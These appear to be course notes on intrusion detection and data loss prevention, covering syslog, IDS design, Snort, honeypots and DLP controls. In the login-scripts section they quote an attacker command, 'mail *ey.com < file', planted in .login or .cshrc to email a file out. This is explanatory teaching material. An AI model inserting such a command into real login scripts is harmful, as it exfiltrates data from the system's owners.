# Module 11: Intrusion Detection Systems (IDS) & Data Loss Prevention (DLP)

---

## 11.1 — Intrusion Detection: Logging & IDS Fundamentals

### Three Types of Intrusion Detection
1. **Log files** — basic review of system logs
2. **Basic intrusion detection** — monitoring events beyond just log files
3. **Full stateful detection** — comprehensive, real-time analysis

---

## Log Files

### UNIX Log Files
- **last log** — lives in the home directory; shows the last time a user logged in and from which machine; differs across UNIX variants
- **utmp** — shows who is currently logged in; sometimes not cleaned up by programs, so it can be unreliable
- **wtmp** — shows login and logout times; the `last` command displays this file
- **⚠️ These log files can be easily modified by an attacker**

### Login Scripts (Attack Vector)
- Certain programs execute when a user logs in (`.login`, `.cshrc`)
- Attackers can insert commands such as `mail *ey.com < file` — this emails out a file **before the attacker has a chance to load a rootkit**

### Syslog
- Very useful logging facility; originally designed for the sendmail application
- **syslogd** — the log daemon that listens for log messages from three sources:
  - `/dev/log`
  - `/dev/klog` — listens for messages from the operating system
  - **Port 514 UDP** — listens for remote syslog messages
- Configuration file: **syslog.conf**

### syslog.conf — Selectors and Actions
- **Selector**: choose which event to log
- **Action**: what to do with the event

**Facilities (event sources):**
- `kern` — operating system
- `user` — user processes
- `mail`
- `auth` — login, su, any program requiring user authentication
- `lpt`
- `daemon`
- `cron`
- `news`
- `mark` — timestamp
- `local 0-8` — custom local use
- `syslog` — can talk to itself
- `ftp`

**Severity Levels (highest to lowest):**
1. `emerg` — about to crash; usually sent by kernel
2. `alert`
3. `crit` (critical)
4. `err` (error)
5. `warning`
6. `notice` — e.g., user runs `su`
7. `info`
8. `debug` — very verbose; rarely enabled; used when debugging applications

**Example syslog.conf rules:**
```
*.err; kern.debug; auth.notice  /dev/console
*.alert                          root
auth.notice                      @logger.xyz.com
```
- Can send to a file (e.g., `/log/messages`)
- Can pipe to a filter to look for keywords
- Syslog adds: **time/date stamp**, **facility**, **process** that made the call

### SuLog
- Logs usage of the `su` command — which user tried to become another user and whether it succeeded
- **One of the first places modified by rootkits**

### Other Logging Sources
- **Cron** — writes to syslog when it starts a scheduled program
- **Sendmail** — can be configured to log every incoming and outgoing mail message (note: privacy implications)
- **Printer activity** — can be logged
- **FTP log**:
  - `ftp -l` — logs who connected
  - `ftp -l -l` — logs all activity (can be overwhelming)
- **.history** — usually destroyed by a hacker on exit from the system
- **Process accounting** — shows every command run by users and how long it took; some programs can log system-level calls; can fill up a drive in days
- **Process list (`ps`)** — can also be logged; `ps` is **usually replaced by rootkits**
- `find -mtime days` — shows things that have been modified; useful for detecting changes in `/bin` directory

### Log Analysis Tools
- **Tripwire** — uses MD5 hashes to determine if the system has changed; works at binary level; use cron to run Tripwire on the `/bin` directory to detect changes
- **Swatch** — filtering of log files

---

## Intrusion Detection System (IDS)

### IDS vs. Log Files
- IDS does **more than just log files**
- Monitors **computer events** and **network events**
- Makes a determination from analysis of events whether an intrusion has occurred

### Why IDS?
- **Detect attacks** and **detect probes**
- **Document threat** — provides real data to support the need for security
- **Quality control** — ensures security policies are working
- **Policy control** — enforces and validates policies
- **Forensic value** — legal proof of an attack that can hold up in court
- Note: IDS **prevents problems** indirectly — an attacker may be deterred if they know IDS is in place

### Functional Components of IDS

**1. Information Sources — Where is it monitoring?**
- Host
- Network
- Application

**2. Analysis — Is this an intrusion?**
- **Misuse detection** — signature-based; matches known attack patterns
- **Virus detection** — matches known malware signatures
- **Anomaly detection** — behavior outside of a baseline

**3. Response — What to do after an attack?**
- **Active response** — some automated method responds; possible attack-back (legal issues exist); automatic reconfiguration of firewalls; blocking IPs that are scanning the network
- **Passive response** — alarms and notifications; logs and reports

### Goals of IDS
- **Accountability** — link the event back to the real cause; provide legal proof of an attack that can hold up in court
- **Response** — options include:
  - Don't care who; just stop the attack
  - Block IPs of attackers and stop the attack
  - Build a legal case and prosecute attackers
- Response and accountability are linked — the system administrator decides how to handle attacks

---

## 11.2 — IDS Architecture, Detection Methods & Honey Pots

### IDS Management Architectures

| Type | Description | Drawback |
|------|-------------|----------|
| **Centralized** | One console, N monitors; everything controlled from one spot | Does not scale well |
| **Partially Distributed** | N consoles, M monitors, one main console; processing at consoles, major alerts sent to main console | — |
| **Distributed** | No interaction between consoles | Cannot tell if a system-wide attack is happening by looking at one console |

- Also consider: **Outside IDS vs. Inside IDS**

### Timing Characteristics
- **Interval-Based** — periodically obtains data from collection points; used on the host-based side
- **Real-Time** — used for network-based IDS

---

### Information Sources

#### Network-Based IDS
- Essentially a **packet sniffer** deployed on the network

**Advantages:**
- Small number of monitors needed (sometimes a single monitor suffices)
- Little impact on the network
- Typically uses an **alternate network for communication**
- Very secure — typically does not have services running on the IDS sensor

**Disadvantages:**
- Network traffic load can be overwhelming
- Must look at **multiple packets** to detect some attacks
- Packets arrive at network speed (hard to keep up)
- **Network topology issues**: switched environments make it harder (traffic is not shared)
- **Encrypted data** cannot be inspected
- Cannot tell if the attack actually worked
- **Fragment attacks** work well against network IDS

#### Switched Network Solution
- In a switched environment, IDS will not pick up traffic between two hosts on the same switch
- Solutions:
  - Place a **hub and tap** between switches to capture traffic
  - Use **mirrored/spanning ports** on the switch
  - Use a **dual-port IDS**
- Traffic between different switches can be captured with a tap on the uplink

#### Host-Based IDS
- A process that runs on the host and gathers information from system logs or the OS

**Advantages:**
- Detects at the **host level**
- Can work in an **encrypted environment**
- Works in a **switched environment**
- Can detect **Trojan horses**

**Disadvantages:**
- Management complexity
- Machine is owned by the user — IDS can be disabled
- Cannot detect **network-wide scans**
- Vulnerable to **DoS**
- Too much data; high **CPU usage**
- Console traffic is **in-band**

#### Application-Based IDS
- Most likely seen on **web servers**

**Advantages:**
- Can look at **user interaction**
- Can work in an **encrypted environment**

**Disadvantages:**
- Less secure (runs at user level)
- User-level access

---

### Making Decisions — Analysis Methods

#### Misuse Detection (Signature-Based)
- Matches traffic against known attack signatures
- **State-based** — not all attacks happen in a single packet

**Advantages:**
- Few false alarms with good signatures
- Can write signatures to be tool-specific (e.g., against specific Nmap scans)
- Easiest to manage

**Disadvantages:**
- Only detects **known** attacks
- Signatures must balance between false alarms and catching all attacks

#### Anomaly Detection
- Builds a profile of **normal use**; alerts on deltas from the baseline
- Methods:
  - **Threshold detection** — build counters (files accessed, login attempts, etc.); is an abnormal number of pings an indication of a scan?
  - **Statistical profiles** — build models of normal behavior
  - **Rule-based models** — define what normal looks like via rules

**Advantages:**
- Can detect **unknown** attacks
- Can serve as a feeder for misuse detection systems

**Disadvantages:**
- Higher **false alarm** rate
- **Training issue** — what is "normal"?

---

### Response Options

#### Active Response
- **Collect additional information** — use uncommon events to ramp up security (e.g., heavy scanning triggers full packet capture)
- **Change environment** — modify firewall or router configurations, close connections
- **Take action** (legal issues still undecided) — tracebacks

#### Passive Response
- **Alarm and notifications** (SNMP)
- **Reports**
- **Failsafe** actions

---

### IDS vs. IPS

| Feature | IDS | IPS |
|---------|-----|-----|
| Watches network traffic for attack patterns | ✓ | ✓ |
| Blocks traffic based on rules | ✗ | ✓ |

### IDS/IPS Accuracy Issues
- **False Positives** — identifying an attack that is not actually there
- **False Negatives** — missing a real attack
- Balancing the false positive and false negative rate is **difficult**
- Large log files are hard to manage

### Before Deployment
- Conduct **Vulnerability Analysis** — clean up systems before installing IDS
- **Identify critical resources**
- **Plan to protect key resources**

---

### Public Domain IDS: Snort (www.snort.org)
- Rule structure: **Rule Header (Rule Options)**
- **Actions**: Alert, Pass, Log, Activate, Dynamic
- **Protocol**: IP
- **Port number**
- **Base** configuration

---

### Honey Pots

#### What is a Honey Pot?
- A system that **looks like something worth breaking into**
- Different implementations with varying levels of data collection
- **HoneyNet** — same concept but an **emulated network**
- **Padded Cell** — works with IDS; if an attack is detected, traffic is switched to a protected/isolated environment

#### Advantages
- Diverts an attacker from real systems
- Buys time for defenders
- Enables monitoring and logging of attacker activity
- Useful for **insider threat** detection

#### Disadvantages
- **Legal issues** (possible entrapment concerns)
- Uncertain general usefulness
- Can make the hacker angry
- Complex to set up and maintain

---

## 11.3 — Data Loss Prevention (DLP)

### The Insider Threat
- Organizations are often reluctant to discuss or address the insider threat
- The exact number of insider attacks is debated, but the threat is real

### Types of Insider Threats
- **Intentional** — consider the number of egress points and protocols involved
- **Accidental** — as applications become more integrated and seamless, it becomes easier to accidentally send data (email, IM, P2P)
- **Intentionally Accidental** — as defenses harden, attackers use social engineering to get users to leak information

### The Careless Insider
- Attackers have shifted focus to employees and home users
- Attack vectors: phishing, viruses, spyware
- Using: email, peer-to-peer, IM, websites, software downloads

---

### Data Awareness: Key Questions
- How much data do you have?
- Where does the data live?
- How many copies are there?
- Who has the copies?
- Do they know they have a copy?
- Do they know how to protect it?
- Do you have a plan?

### Data is Like Water
- Just as most of the earth is water, most of an organization is based on data
- Data, like water, is **hard to hold onto once it leaves its container**
- Like water, many people are willing to share data when asked
- One key difference: **data can be copied**

### Data Leakage Drivers
- Increasing number of protocols (encrypted, anonymous, evasive)
- Increasing number of attackers
- Increasing number of user-driven applications
- Increasing amount of data
- Increasing government intervention/regulation
- Increasing number of attacks targeting insiders

---

### Data Loss Prevention (DLP) Framework

#### Key Questions for DLP
- Where is your data located? (Centralized, distributed, or both)
- Who has access? (Read, write, delete)
- Who controls your data? (Owners, users, anyone)
- Do you manage **data at rest**, **data in motion**, and **data in devices**?

#### Data at Rest
- Data stored somewhere (often everywhere)
- Key concerns: how many ways can it be copied, moved, or examined?
- **Discovery** — how do you find your data at rest?
- **Protection** — encryption, device locking

#### Data in Motion
- Used to keep private information from leaving the organization (SS Numbers, Account Numbers, Records)
- Will either **log**, **stop**, or **encrypt** violating content
- Concerns: what protocols are in use, what user-installed applications are present, what confidential data is leaving

#### Data in Devices
- Do people carry data with them? (phones, laptops, tablets, new technology)
- Do people remotely access data from mobile devices?

---

### The Five C's of Data Protection

| # | C | Description |
|---|---|-------------|
| 1 | **Classification** | Develop a taxonomy for data types; assign levels of protection |
| 2 | **Compartmentalization** | Control who has access to what data |
| 3 | **Cryptography** | Encrypt data at rest, in motion, and on devices |
| 4 | **Contingency Planning** | Plan for data loss before it happens |
| 5 | **Coaching** | Train everyone on data stewardship |

---

### 1. Data Classification

**Process:**
1. Develop a taxonomy for your data types (industry-specific)
2. Decide what levels of protection are needed for each classification
3. Find the data in your organization
4. Move, destroy, or protect it accordingly
5. Develop a plan to **keep looking** for new data

**Classification Levels (example):**
- **Restricted** — highest sensitivity (SSNs, credit card numbers, financial account numbers, driver's license numbers, health info/PHI, passport numbers, export-controlled info, authentication credentials)
- **High** — confidential employee records, student data, disciplinary files, research data, employment applications, privileged attorney-client communications
- **Moderate** — directory information, approved census facts
- **Low** — publicly available information

**FIPS 199 Standard** — used when classification is uncertain; evaluates impact across three security objectives:

| Security Objective | Limited Impact | Serious Impact | Severe Impact |
|-------------------|---------------|----------------|---------------|
| **Confidentiality** | Unauthorized disclosure has limited adverse effect | Serious adverse effect | Severe or catastrophic adverse effect |
| **Integrity** | Unauthorized modification has limited adverse effect | Serious adverse effect | Severe or catastrophic adverse effect |
| **Availability** | Disruption of access has limited adverse effect | Serious adverse effect | Severe or catastrophic adverse effect |

**Finding Your Data:**
- Automated software can help (agent-based, host/server-based, or standalone)
- Consider holding a "spring cleaning" day: shred paper, remove files, know what you have

---

### 2. Compartmentalization

Assume the attacker is acting as an insider — control who has access to what data.

**Network-Based Compartmentalization**
- Typically uses technology to enforce internal separation
- Internal firewalls, **VLANs**, **VPNs**
- Monitor internal network access
- Pay attention to **wireless** network exposure

**Host/Server-Based Compartmentalization**
- Know what data is stored on which host
- Use agent software
- Control access to server shares (authentication-based)
- Limit access to only people who **need to know**
- Beware of host-to-host authentication vulnerabilities

**Data Source-Based Compartmentalization**
- Control access to databases, files, etc.
- Authenticated-based and **role-based access**
- Use network-based compartmentalization to help restrict access

**Authentication Control**
- **Network**: VPN (typically external-to-internal)
- **Host/server**: Network shares with user login; look at login-based mounting; question whether all shares should be mounted
- **Data source**: Not everyone should have access to all data; define who has access to what in the database

---

### 3. Cryptography

**Whole Disk Encryption**
- A must for laptops that leave the organization
- Issues: key escrow, overseas travel restrictions
- **What it fixes**: lost or stolen devices
- **What it does NOT fix**: user-driven data loss

**Mobile Device Cryptography**
- Harder problem; newer devices are starting to support this
- Same issues as laptops

**File-Based Cryptography**
- Not as common; typical for specific data files on servers (SSNs, credit cards, etc.)
- Effective against an attacker stealing the file
- **Not effective** against malware or embedded/hardcoded keys

**Egress Cryptography**
- Encrypts data when it leaves the organization
- May be required by government regulations
- Often better to use a **secure web-based portal**

**Data in Motion Cryptography**
- Used when data leaves the organization: secure web (HTTPS), VPN
- Sometimes used between front-end server and back-end database

---

### 4. Contingency Planning

**Assume you will lose data** — know what you're going to do ahead of time:
- How to deal with customers after a breach
- How to deal with the public
- How do you know what you lost? (Auditing, logging, forensics)
- How are you going to recover? (e.g., destroyed data — Sony example)

---

### 5. Coaching (Security Literacy)

Everyone needs to understand:
- Data is important
- What it means to be a **good data steward**
- Their role in security
- **Do NOT make it a penalty** for having data as new data protection models are adopted
- Security literacy and awareness are essential

---

### DLP Technology

#### Outbound Content Management
- Keeps private information from leaving: SSNs, account numbers, records
- Actions: **log**, **stop**, or **encrypt** violating content
- Monitors: protocols, user-installed applications, confidential data

#### Data Loss Prevention (DLP) Systems
- Stop data from leaving the organization
- Like an IDS/IPS but looks at the **payload**

**Two Data Types DLP Handles:**
- **Structured data** — can be matched to a list (e.g., credit card number patterns)
- **Unstructured data** — letters, memos, freeform text

**DLP Detection Methods:**
- **Structured**: Pattern matching
- **Unstructured**: Fingerprinting, lexical analysis
- **Endpoint**: Data discovery on devices

**DLP Actions When Data is Found Leaving:**
- **Block** the transfer
- **Log** the event
- **Redirect or quarantine** the data

**DLP Deployment Modes:**
- **Single Port DLP** — inline on a single network path
- **Dual Port DLP** — monitors traffic on two network paths

---

### Web Filters

**Types:**
- **Client-Based** — software installed on the client device; filters at the endpoint
- **Proxy-Based** — all web traffic routes through a proxy that applies filtering rules
- **Network-Based** — filters applied at the network level, inspecting all passing traffic

### Protocol Filtering

**Detection Methods:**
- Port numbers
- Single packet payload inspection
- Stream payload inspection

**Mitigation Actions:**
- **QoS** (Quality of Service) — throttle or deprioritize unwanted traffic
- **In-Line Blocking** — directly block the traffic in the network path
- **RST Blocking** — send TCP reset packets to tear down unwanted connections
